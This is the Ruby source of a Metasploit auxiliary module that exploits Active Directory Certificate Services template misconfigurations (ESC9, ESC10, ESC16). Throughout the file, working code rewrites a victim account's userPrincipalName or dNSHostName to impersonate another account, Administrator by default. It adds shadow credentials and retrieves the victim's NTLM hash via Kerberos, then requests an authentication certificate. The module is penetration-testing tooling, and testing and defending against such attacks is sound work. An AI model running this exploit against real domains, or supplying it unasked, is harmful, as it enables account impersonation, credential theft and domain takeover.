##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'ruby_smb/dcerpc/client'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::LDAP
  include Msf::Exploit::Remote::LDAP::ActiveDirectory
  include Msf::Exploit::Remote::MsIcpr
  include Msf::Exploit::Remote::SMB::Client::Authenticated
  include Msf::Exploit::Remote::DCERPC
  include Msf::Auxiliary::Report
  include Msf::OptionalSession::SMB

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Exploits AD CS Template misconfigurations which involve updating an LDAP object: ESC9, ESC10, and ESC16',
        'Description' => %q{
          This module exploits Active Directory Certificate Services (AD CS) template misconfigurations, specifically
          ESC9, ESC10, and ESC16, by updating an LDAP object and requesting a certificate on behalf of a target user.
          The module leverages the auxiliary/admin/ldap/ldap_object_attribute module to update the LDAP object and the
          admin/ldap/shadow_credentials module to add shadow credentials for the target user if the target password is
          not provided. It then uses the admin/kerberos/get_ticket module to retrieve the NTLM hash of the target user
          and requests a certificate via MS-ICPR. The resulting certificate can be used for various operations, such as
          authentication.

          The module ensures that any changes made by the ldap_object_attribute or shadow_credentials module are
          reverted after execution to maintain system integrity.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'Will Schroeder', # original idea/research
          'Lee Christensen', # original idea/research
          'Oliver Lyak', # certipy implementation
          'Spencer McIntyre', # icpr_cert module implementation
          'jheysel-r7' # module implementation
        ],
        'References' => [
          [ 'URL', 'https://github.com/GhostPack/Certify' ],
          [ 'URL', 'https://github.com/ly4k/Certipy' ],
          [ 'URL', 'https://medium.com/@offsecdeer/adcs-exploitation-series-part-2-certificate-mapping-esc15-6e19a6037760' ],
          [ 'URL', 'https://www.thehacker.recipes/ad/movement/adcs/certificate-templates#esc16-a-compatibility-mode' ],
          [ 'ATT&CK', Mitre::Attack::Technique::T1098_ACCOUNT_MANIPULATION ],
          [ 'ATT&CK', Mitre::Attack::Technique::T1649_STEAL_OR_FORGE_AUTHENTICATION_CERTIFICATES ]
        ],
        'Notes' => {
          'Reliability' => [],
          'Stability' => [],
          'SideEffects' => [ IOC_IN_LOGS ],
          'AKA' => [ 'ESC9', 'ESC10', 'ESC16']
        },
        'Actions' => [
          [ 'REQUEST_CERT', { 'Description' => 'Request a certificate' } ]
        ],
        'DefaultAction' => 'REQUEST_CERT'
      )
    )

    deregister_options('PFX', 'ON_BEHALF_OF', 'Session', 'SMBuser', 'SMBPass', 'SMBDomain')

    register_options([
      OptString.new('LDAPDomain', [true, 'The domain to authenticate to']),
      OptString.new('LDAPUsername', [true, 'The username to authenticate with, who must have permissions to update the TARGET_USERNAME']),
      OptString.new('LDAPPassword', [true, 'The password to authenticate with']),
      OptEnum.new('UPDATE_LDAP_OBJECT', [ true, 'Either userPrincipalName or dNSHostName, Updates the necessary object of a specific user before requesting the cert.', 'userPrincipalName', %w[userPrincipalName dNSHostName] ]),
      OptString.new('UPDATE_LDAP_OBJECT_VALUE', [ true, 'The account name you wish to impersonate', 'Administrator']),
      OptString.new('TARGET_USERNAME', [true, 'The username of the target LDAP object (the victim account).'], aliases: ['SMBUser']),
      OptString.new('TARGET_PASSWORD', [false, 'The password of the target LDAP object (the victim account). If left blank, Shadow Credentials will be used to authenticate as the TARGET_USERNAME'], aliases: ['SMBPass']),
      OptString.new('CertificateAuthorityRhost', [false, 'The IP Address of the CA. The module will attempt to resolve this via DNS if this is not set'])
    ])

    register_advanced_options(
      [
        OptString.new('BASE_DN', [false, 'LDAP base DN if you already have it']),
        OptInt.new('LDAPRport', [false, 'The target LDAP port.', 389]),
      ]
    )
  end

  # For more info on FQDN validation: https://stackoverflow.com/questions/11809631/fully-qualified-domain-name-validation
  def valid_fqdn?(str)
    str =~ /\A(?=.{1,253}\z)(?:(?!-)[a-zA-Z0-9-]{1,63}(?<!-)\.)+[a-zA-Z]{2,}\z/
  end

  def validate_options
    if datastore['UPDATE_LDAP_OBJECT'] == 'dNSHostName' && !valid_fqdn?(datastore['UPDATE_LDAP_OBJECT_VALUE'])
      fail_with(Failure::BadConfig, "When UPDATE_LDAP_OBJECT is set to 'dNSHostName', UPDATE_LDAP_OBJECT_VALUE must be set to a valid FQDN.")
    end
  end

  def run
    @dc_ip = datastore['RHOSTS']
    validate_options
    send("action_#{action.name.downcase}")
  rescue MsIcprConnectionError, SmbIpcConnectionError => e
    fail_with(Failure::Unreachable, e.message)
  rescue MsIcprAuthenticationError, MsIcprAuthorizationError, SmbIpcAuthenticationError => e
    fail_with(Failure::NoAccess, e.message)
  rescue MsIcprNotFoundError => e
    fail_with(Failure::NotFound, e.message)
  rescue MsIcprUnexpectedReplyError => e
    fail_with(Failure::UnexpectedReply, e.message)
  rescue MsIcprUnknownError => e
    fail_with(Failure::Unknown, e.message)
  end

  def call_ldap_object_module(action, value = nil)
    mod_refname = 'auxiliary/admin/ldap/ldap_object_attribute'

    print_status("Loading #{mod_refname}")
    ldap_update_module = framework.modules.create(mod_refname)

    unless ldap_update_module
      print_error("Failed to load module: #{mod_refname}")
      return
    end

    # Default to using the SMB credentials if LDAP credentials are not provided
    ldap_update_module = framework.modules.create(mod_refname)
    ldap_update_module.datastore['RHOST'] = datastore['RHOST']
    ldap_update_module.datastore['RPORT'] = datastore['LDAPRport']
    ldap_update_module.datastore['BASE_DN'] = datastore['BASE_DN']
    ldap_update_module.datastore['VERBOSE'] = datastore['VERBOSE']
    ldap_update_module.datastore['LDAPDomain'] = datastore['LDAPDomain']
    ldap_update_module.datastore['LDAPUsername'] = datastore['LDAPUsername']
    ldap_update_module.datastore['LDAPPassword'] = datastore['LDAPPassword']
    ldap_update_module.datastore['OBJECT'] = datastore['TARGET_USERNAME']
    ldap_update_module.datastore['ATTRIBUTE'] = datastore['UPDATE_LDAP_OBJECT']
    ldap_update_module.datastore['OBJECT_LOOKUP'] = 'sAMAccountName'
    ldap_update_module.datastore['VALUE'] = value
    ldap_update_module.datastore['ACTION'] = action

    print_status("Running #{mod_refname}")
    ldap_update_module.run_simple(
      'LocalInput' => user_input,
      'LocalOutput' => user_output,
      'RunAsJob' => false
    )
  end

  def call_shadow_credentials_module(action, device_id = nil)
    mod_refname = 'admin/ldap/shadow_credentials'

    print_status("Loading #{mod_refname}")
    ldap_update_module = framework.modules.create(mod_refname)

    unless ldap_update_module
      print_error("Failed to load module: #{mod_refname}")
      return
    end

    # Default to using the SMB credentials if LDAP credentials are not provided
    ldap_update_module = framework.modules.create(mod_refname)
    ldap_update_module.datastore['RHOST'] = datastore['RHOST']
    ldap_update_module.datastore['RPORT'] = datastore['LDAPRport']
    ldap_update_module.datastore['VERBOSE'] = datastore['VERBOSE']
    ldap_update_module.datastore['LDAPDomain'] = datastore['LDAPDomain']
    ldap_update_module.datastore['LDAPUsername'] = datastore['LDAPUsername']
    ldap_update_module.datastore['LDAPPassword'] = datastore['LDAPPassword']
    ldap_update_module.datastore['TARGET_USER'] = datastore['TARGET_USERNAME']
    ldap_update_module.datastore['DEVICE_ID'] = device_id[:device_id] if action == 'remove' && device_id.present?
    ldap_update_module.datastore['ACTION'] = action

    print_status("Running #{mod_refname}")
    ldap_update_module.run_simple(
      'LocalInput' => user_input,
      'LocalOutput' => user_output,
      'RunAsJob' => false
    )
  end

  def automate_get_hash(cert_path, username, domain, rhosts)
    mod_refname = 'admin/kerberos/get_ticket'

    print_status("Loading #{mod_refname}")
    get_ticket_module = framework.modules.create(mod_refname)

    unless get_ticket_module
      print_error("Failed to load module: #{mod_refname}")
      return
    end

    print_status("Getting hash for #{username}")
    get_ticket_module.datastore['CERT_FILE'] = cert_path
    get_ticket_module.datastore['USERNAME'] = username
    get_ticket_module.datastore['DOMAIN'] = domain
    get_ticket_module.datastore['RHOSTS'] = rhosts
    get_ticket_module.datastore['RPORT'] = 88
    get_ticket_module.datastore['ACTION'] = 'GET_HASH'

    res = get_ticket_module.run_simple(
      'LocalInput' => user_input,
      'LocalOutput' => user_output,
      'RunAsJob' => false
    )
    fail_with(Failure::Unknown, 'Failed to get hash for target user') unless res
    res
  end

  def action_request_cert
    new_value = datastore['UPDATE_LDAP_OBJECT_VALUE']
    # Get the original while updating (the update action returns the original value upon success)
    @original_value = call_ldap_object_module('UPDATE', new_value)
    fail_with(Failure::BadConfig, "The #{datastore['UPDATE_LDAP_OBJECT']} of #{datastore['TARGET_USERNAME']} is already set to #{datastore['UPDATE_LDAP_OBJECT_VALUE']}. After the module completes running it will revert the attribute to it's original value which will cause the certificate produced to throw a KDC_ERR_CLIENT_NAME_MISMATCH when attempting to use it. Try setting the #{datastore['UPDATE_LDAP_OBJECT']} of #{datastore['TARGET_USERNAME']} to anything but #{datastore['UPDATE_LDAP_OBJECT_VALUE']} using the ldap_object_attribute module and then rerun this module.") if @original_value.present? && @original_value.casecmp?(datastore['UPDATE_LDAP_OBJECT_VALUE'])

    smbpass = ''

    if datastore['TARGET_PASSWORD'].present?
      smbpass = datastore['TARGET_PASSWORD']
    elsif datastore['LDAPUsername'] == datastore['TARGET_USERNAME']
      smbpass = datastore['LDAPPassword']
    else
      # Call the shadow credentials module to add the device and get the cert path
      print_status("Adding shadow credentials for #{datastore['TARGET_USERNAME']}")
      @device_id, cert_path = call_shadow_credentials_module('add')
      smbpass = automate_get_hash(cert_path, datastore['TARGET_USERNAME'], datastore['LDAPDomain'], datastore['RHOSTS'])
    end
    ca_ip = datastore['CertificateAuthorityRhost'].present? ? datastore['CertificateAuthorityRhost'] : resolve_ca_ip
    with_ipc_tree do |opts|
      datastore['SMBUser'] = datastore['TARGET_USERNAME']
      datastore['SMBPass'] = smbpass
      datastore['RHOSTS'] = ca_ip
      request_certificate(opts)
    end
  ensure
    datastore['RHOSTS'] = @dc_ip
    unless @device_id.nil?
      print_status('Removing shadow credential')
      call_shadow_credentials_module('remove', device_id: @device_id)
    end
    print_status('Reverting ldap object')
    revert_ldap_object
  end

  def resolve_ca_ip
    vprint_status('Finding CA server in LDAP')
    ca_servers = []
    ldap_connect(port: datastore['LDAPRport']) do |ldap|
      validate_bind_success!(ldap)
      if (@base_dn = datastore['BASE_DN'])
        print_status("User-specified base DN: #{@base_dn}")
      else
        print_status('Discovering base DN automatically')

        unless (@base_dn = ldap.base_dn)
          fail_with(Failure::NotFound, "Couldn't discover base DN!")
        end
      end
      ca_servers = adds_get_ca_servers(ldap)
      vprint_status("Found #{ca_servers.length} CA servers in LDAP")
    end

    if ca_servers.empty?
      fail_with(Msf::Module::Failure::UnexpectedReply, 'No Certificate Authority servers found in LDAP.')
      return
    else
      ca_servers.each do |ca|
        vprint_good("Found CA: #{ca[:name]} (#{ca[:dNSHostName]})")
      end
    end

    ca_entry = ca_servers.find { |ca| ca[:name].casecmp?(datastore['CA']) }

    unless ca_entry
      fail_with(Msf::Module::Failure::UnexpectedReply, "CA #{datastore['CA']} not found in LDAP. Checking registry values is unable to continue")
    end

    ca_dns_hostname = ca_entry[:dNSHostName]
    ca_ip_address = Rex::Socket.getaddress(ca_dns_hostname, false)
    unless ca_ip_address
      print_error("Unable to resolve the DNS Host Name of the CA server: #{ca_dns_hostname}. Checking registry values is unable to continue")
      return
    end
    ca_ip_address
  end

  def revert_ldap_object
    # If the UPN was changed the certificate we requested won't work until we revert the UPN change. If the
    # dnsHostName was changed the cert will still work however we'll revert the change to keep the system clean.
    if @original_value.to_s.empty?
      call_ldap_object_module('DELETE')
    else
      call_ldap_object_module('UPDATE', @original_value)
    end
  end

  # @yieldparam options [Hash] If a SMB session is present, a hash with the IPC tree present. Empty hash otherwise.
  # @return [void]
  def with_ipc_tree
    opts = {}
    if session
      print_status("Using existing session #{session.sid}")
      self.simple = session.simple_client
      opts[:tree] = simple.client.tree_connect("\\\\#{client.dispatcher.tcp_socket.peerhost}\\IPC$")
    end

    yield opts
  ensure
    opts[:tree].disconnect! if opts[:tree]
  end
end
